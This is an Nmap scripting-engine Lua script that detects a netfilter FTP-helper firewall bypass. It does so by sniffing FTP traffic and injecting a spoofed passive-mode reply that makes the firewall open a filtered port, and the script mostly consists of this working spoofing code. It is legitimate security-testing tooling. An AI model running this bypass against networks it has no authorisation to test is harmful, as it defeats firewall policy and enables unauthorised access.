local nmap = require "nmap"
local stdnse = require "stdnse"
local bit = require "bit"
local string = require "string"
local packet = require "packet"

description = [[
Detects a vulnerability in netfilter and other firewalls that use helpers to
dynamically open ports for protocols such as ftp and sip.

The script works by spoofing a packet from the target server asking for opening
a related connection to a target port which will be fulfilled by the firewall
through the adequate protocol helper port. The attacking machine should be on
the same network segment as the firewall for this to work. The script supports
ftp helper on both IPv4 and IPv6. Real path filter is used to prevent such
attacks.

Based on work done by Eric Leblond.

For more information, see:

* http://home.regit.org/2012/03/playing-with-network-layers-to-bypass-firewalls-filtering-policy/
]]

---
-- @args firewall-bypass.helper The helper to use. Defaults to <code>ftp</code>.
-- Supported helpers: ftp (Both IPv4 and IPv6).
--
-- @args firewall-bypass.helperport If not using the helper's default port.
--
-- @args firewall-bypass.targetport Port to test vulnerability on. Target port should be a
-- non-open port. If not given, the script will try to find a filtered or closed port from
-- the port scan results.
--
-- @usage
-- nmap --script firewall-bypass <target>
-- nmap --script firewall-bypass --script-args firewall-bypass.helper="ftp", firewall-bypass.targetport=22 <target>
--
-- @output
-- Host script results:
-- | firewall-bypass:
-- |_  Firewall vulnerable to bypass through ftp helper. (IPv4)

author = "Hani Benhabiles"

license = "Same as Nmap--See https://nmap.org/book/man-legal.html"

categories = {"vuln", "intrusive"}

ftp_helper = {
  should_run = function(host, helperport)
    local helperport = helperport or 21
    -- IPv4 and IPv6 are supported
    if nmap.address_family() ~= 'inet' and nmap.address_family() ~= 'inet6' then
      return false
    end

    -- Test if helper port is open
    local testsock = nmap.new_socket()
    testsock:set_timeout(1000)
    local status, _ = testsock:connect(host.ip, helperport)
    testsock:close()
    if not status then
      stdnse.debug1("Unable to connect to %s helper port.", helperport)
      return false
    end
    return true
  end,

  attack = function(host, helperport, targetport)
    local ethertype, payload
    local isIp4 = nmap.address_family() == 'inet' -- True if we are using IPv4. Otherwise, it is IPv6

    if isIp4 then
      -- IPv4 payload
      payload = "227 Entering Passive Mode (" ..
      string.gsub(host.ip,"%.",",") .. "," ..
      bit.band(bit.rshift(targetport, 8), 0xff) ..
      "," .. bit.band(targetport, 0xff) ..
      ")\r\n"
      ethertype = "\x08\0" -- Ethernet Type: IPv4

    else
      -- IPv6 payload
      payload = "229 Extended Passive Mode OK (|||" .. targetport .. "|)\r\n"
      ethertype = "\x86\xdd" -- Ethernet Type: IPv6
    end

    helperport = helperport or 21
    local function spoof_ftp_packet(host, helperport, targetport)
      -- Sniffs the network for src host host.ip and src port helperport
      local filter = "src host " .. host.ip .. " and tcp src port " .. helperport
      local status, l2data, l3data
      local timeout = 1000
      local start = nmap.clock_ms()

      -- Start sniffing
      local sniffer = nmap.new_socket()
      sniffer:set_timeout(100)
      sniffer:pcap_open(host.interface, 256, true, filter)

      -- Until we get adequate packet
      while (nmap.clock_ms() - start) < timeout do
        local _
        status, _, l2data, l3data = sniffer:pcap_receive()
        if status and string.find(l3data, "220 ") then
          break
        end
      end
      if not status then
        stdnse.debug1("pcap read timed out")
        return false
      end

      -- Get ethernet values
      local f = packet.Frame:new(l2data)
      f:ether_parse()

      local p = packet.Packet:new(l3data, #l3data)
      if isIp4 then
        if not p:ip_parse() then
          -- An error happened
          stdnse.debug1("Couldn't parse IPv4 sniffed packet.")
          sniffer:pcap_close()
          return false
        end
      else
        if not p:ip6_parse() then
          -- An error happened
          stdnse.debug1("Couldn't parse IPv6 sniffed packet.")
          sniffer:pcap_close()
          return false
        end
      end

      -- Spoof packet
      -- 1. Invert ethernet addresses
      f.frame_buf = f.mac_src .. f.mac_dst .. ethertype

      -- 2. Modify packet payload
      p.buf = string.sub(p.buf, 1, p.tcp_data_offset) ..  payload
      -- 3. Increment IP ID field (IPv4 packets)
      if isIp4 then
        p:ip_set_id(p.ip_id + 1)
      end

      -- 4. Set TCP sequence number correctly using traffic data
      p:tcp_set_seq(p.tcp_seq + p.tcp_data_length)

      -- 5. Update all checksums and lengths
      if isIp4 then
        -- Packet length field
        p:ip_set_len(#p.buf)
        p:ip_count_checksum()
      else
        -- Payload length field
        p:ip6_set_plen(#p.buf - p.tcp_offset)
      end
      p:tcp_count_checksum()

      -- and finally, we send it.
      local dnet = nmap.new_dnet()
      dnet:ethernet_open(host.interface)
      dnet:ethernet_send(f.frame_buf .. p.buf)
      status = sniffer:pcap_receive()
      dnet:ethernet_close()
      return true
    end

    local co = stdnse.new_thread(spoof_ftp_packet, host, helperport, targetport)

    -- Wait for packet spoofing thread
    stdnse.sleep(1)
    -- Make connection to the target while packet the spoofing thread is sniffing for packets
    local socket = nmap.new_socket()
    socket:set_timeout(3000)
    local status, _ = socket:connect(host.ip, helperport)
    if not status then
      -- Problem connecting to helper port
      stdnse.debug1("Problem connecting to helper port %s.", tostring(helperport))
      return
    end

    -- wait packet spoofing thread to finish
    stdnse.sleep(1.5)
    socket:close()
    return
  end,
}

-- List of helpers
local helpers = {
  ftp = ftp_helper, -- FTP (IPv4 and IPv6)
}

local helper

hostrule = function(host)
  helper = stdnse.get_script_args(SCRIPT_NAME .. ".helper")

  if not nmap.is_privileged() then
    nmap.registry[SCRIPT_NAME] = nmap.registry[SCRIPT_NAME] or {}
    if not nmap.registry[SCRIPT_NAME].rootfail then
      stdnse.verbose1("lacks privileges." )
      nmap.registry[SCRIPT_NAME].rootfail = true
    end
    return false
  end

  if not host.interface then
    return false
  end

  if helper and not helpers[helper] then
    stdnse.debug1("%s helper not supported at the moment.", helper)
    return false
  end

  return true
end

action = function(host, port)
  local helperport = tonumber(stdnse.get_script_args(SCRIPT_NAME .. ".helperport"))
  local targetport = tonumber(stdnse.get_script_args(SCRIPT_NAME .. ".targetport"))
  local helpername

  if targetport then
    -- We should check if target port is not already open
    local testsock = nmap.new_socket()
    testsock:set_timeout(1000)
    local status, _ = testsock:connect(host.ip, targetport)
    if status then
      stdnse.debug1("%s target port already open.", targetport)
      return nil
    end
    testsock:close()
  else
    -- If not target port specified, we try to get a filtered port,
    -- which would be more likely blocked by a firewall before looking for a closed one.
    local port = nmap.get_ports(host, nil, "tcp", "filtered") or nmap.get_ports(host, nil, "tcp", "closed")
    if port then
      targetport = port.number
      stdnse.debug1("%s chosen as target port.", targetport)
    else
      -- No closed or filtered ports to check on.
      stdnse.debug1("Target port not specified and no closed or filtered port found.")
      return
    end
  end
  -- If helper chosen by user
  if helper then
    if helpers[helper].should_run(host, helperport) then
      helpers[helper].attack(host, helperport, targetport)
    else
      return
    end
    -- If no helper chosen manually, we iterate over table to find a suitable one.
  else
    for i, helper in pairs(helpers) do
      if helper.should_run(host, helperport) then
        helpername = i
        stdnse.debug1("%s chosen as helper.", helpername)
        helper.attack(host, helperport, targetport)
        break
      end
    end
    if not helpername then
      stdnse.debug1("no suitable helper found.")
      return nil
    end
  end

  -- Then we check if target port is now open.
  local testsock = nmap.new_socket()
  testsock:set_timeout(1000)
  local status, _ = testsock:connect(host.ip, targetport)
  testsock:close()
  if status then
    -- If we could connect, then port is open and firewall is vulnerable.
    local vulnstring = "Firewall vulnerable to bypass through " .. (helper or helpername) .. " helper. "
    .. (nmap.address_family() == 'inet' and "(IPv4)" or "(IPv6)")

    return stdnse.format_output(true, vulnstring)
  end
end
